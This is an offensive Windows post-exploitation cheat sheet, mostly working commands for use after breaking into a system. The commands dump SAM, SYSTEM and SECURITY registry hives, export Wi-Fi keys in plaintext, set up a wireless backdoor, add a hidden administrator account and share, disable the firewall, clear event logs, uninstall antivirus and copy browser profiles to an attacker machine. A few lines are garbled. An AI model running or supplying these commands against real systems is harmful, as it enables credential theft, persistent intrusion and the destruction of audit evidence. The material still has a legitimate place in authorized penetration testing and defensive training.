# Windows Post exploit CheatSheet

## Information Gathering

### Blind Files

```
%SYSTEMDRIVE%\boot.ini
%WINDIR%\win.ini
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\RegBack\system
%SYSTEMDRIVE%\autoexec.bat
```

### System Commands 

```
whoami
whoami /all
set : Shows all current environmental variables
fsutil fsinfo drives : Must be an administrator to run this, but it lists the current drives on the system
reg query HKLM /s /d /f "C:\* *.exe" | find /I "C:\" | find /V """"
```

### Networking

```
ipconfig /all
ipconfig /displaydns
netstat -nabo
netstat -r
netstat -na http://www.securityaegis.com/ntsd-backdoor/ | findstr :445
netstat -nao | findstr LISTENING
netstat -anob | findstr “services, process or port”
net view : Queries NBNS/SMB (SAMBA) and tries to find all hosts in your current workgroup or domain
net view /domain : List all domains available to the host
net view /domain:otherdomain : Queries NBNS/SMB (SAMBA) and tries to find all hosts in the ‘otherdomain’
net user %USERNAME% /domain
net user /domain
net accounts
net accounts /domain
net localgroup administrators
net localgroup administrators /domain
net group “Domain Admins” /domain
net group “Enterprise Admins” /domain
net group “Domain Controllers” /domain
net share
net session | find / “\\”
arp -a
route print
browstat
netsh wlan show profiles
netsh wlan export profile folder=. key=clear : exports a user wifi profile with the password in plaintext to an xml file in the current working directory
netsh wlan [start|stop] hostednetwork : Starts or stops a wireless backdoor on a windows 7
netsh wlan set hostednetwork ssid=<ssid> key=<passphrase> keyUsage=persistent|temporary : Complete hosted network setup for creating a wireless backdoor on win 7
netsh wlan set hostednetwork mode=[allow|disallow]
wmic ntdomain list : Retrieve information about Domain and Domain Controller
```

### Configs

```
gpresult /z
sc qc <servicename>
sc query
sc queryex
type %WINDIR%\System32\drivers\etc\hosts
echo %COMSPEC% : Usually going to be cmd.exe in the Windows directory, but it’s good to know for sure
c:\windows\system32\gathernetworkinfo.vbs : enumerates registry, firewall config, dns cache, etc.Included script with Windows 7
```

### Important Files Research

```
tree C:\ /f /a > C:\output_of_tree.txt
dir /a
dir /b /s [Directory or Filename]
dir \ /s /b | find /I “searchstring”
command | find /c /v “”
```

### Files to retrieve (if possible)

```
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\iis6.log (5, 6 or 7)
%WINDIR%\system32\logfiles\httperr\httperr1.log : IIS6
%SystemDrive%\inetpub\logs\LogFiles  : IIS7
%WINDIR%\system32\logfiles\w3svc1\exYYMMDD.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
unattend.txt, unattend.xml, sysprep.inf : Used in the automated deployment of windows images and can contain user accounts. Usually found in %WINDIR%\Panther\ or %WINDIR%\Panther\Unattend\ also in Registry at HKLM\System\Setup!UnattendFile
```

## Remote System Access 

```
net share \\computername
tasklist /V /S computername
qwinsta /SERVER:computername
qprocess /SERVER:computername *
net use \\computername
net use \\computername /user:DOMAIN\username password
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f : enable remote desktop
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fAllowToGetHelp /t REG_DWORD /d 1 /f : enable remote assistance
```

## Persistance

### Binary implant

```
msiexec.exe
%SystemRoot%\System32\wbem\mof\
```

Check the $PATH environmental variable

## WMI

```
wmic bios
wmic qfe qfe get hotfixid
  (This gets patches IDs)
wmic startupwmic service
wmic process get caption,executablepath,commandline
wmic process call create “process_name” (executes a program)
wmic process where name=”process_name” call terminate (terminates program)
wmic logicaldisk where drivetype=3 get name, freespace, systemname, filesystem, size, volumeserialnumber (hard drive information)
wmic useraccount (usernames, sid, and various security related goodies)
wmic useraccount get /ALL
wmic share get /ALL (you can use ? for gets help ! )
wmic startup list full (this can be a huge list!!!)
wmic /node:"hostname" bios get serialnumber (this can be great for finding warranty info about target)
```

## Reg Command edit

```
reg save HKLM\Security security.hive  (Save security hive to a file)
reg save HKLM\System system.hive (Save system hive to a file)
reg save HKLM\SAM sam.hive (Save sam to a file)=
reg add [\\TargetIPaddr\] [RegDomain][ \Key ] 
reg export [RegDomain]\[Key] [FileName] 
reg import [FileName ]
reg query [\\TargetIPaddr\] [RegDomain]\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )
```

## Deleting Logs
```
wevtutil el  (list logs)
wevtutil cl <LogName> (Clear specific lowbadming)
del %WINDIR%\*.log /a /s /q /f
```

## Uninstall AntiVirus
```
wmic product get name /value (this gets software names)
wmic product where name="XXX" call uninstall /nointeractive (this uninstalls software)
```

## Other stuffs
```
pkgmgr usefull  /iu :”Package”
pkgmgr usefull  /iu :”TelnetServer” (Install Telnet Service ...)
pkgmgr /iu:”TelnetClient” (Client )
rundll32.exe user32.dll, LockWorkStation (locks the screen -invasive-)
wscript.exe <script js/vbs>
cscript.exe <script js/vbs/c#>
xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box\firefox_funstuff
OS SPECIFICwmicWin2k3
winpop stat domainname
```

## Vista/7 
```
winstat features
wbadmin get status
wbadmin get items
gpresult /H gpols.htm
bcdedit /export <filename>
```

## Vista SP1/7/2008/2008R2 (x86 & x64)

Enable/Disable Windows features with Deployment Image Servicing and Management (DISM):
*Note* Works well after bypassuac + getsystem (requires system privileges)
*Note2* For Dism.exe to work on x64 systems, the long commands are necessary

To list features which can be enabled/disabled:
```
%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /get-features
```

To enable a feature (TFTP client for example):
```
%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /enable-feature /featurename:TFTP
```

To disable a feature (again TFTP client):
```
%windir%\System32\cmd.exe /c "%SystemRoot%\system32\Dism.exe" /online /disable-feature /featurename:TFTP
```

## Invasive Commands
```
net user hacker hacker /add
net localgroup administrators /add hacker
net localgroup administrators hacker /add
net share nothing$=C:\ /grant:hacker,FULL /unlimited
net user username /active:yes /domain
netsh firewall set opmode disable
netsh firewall set opmode enable
```

## Links
https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit
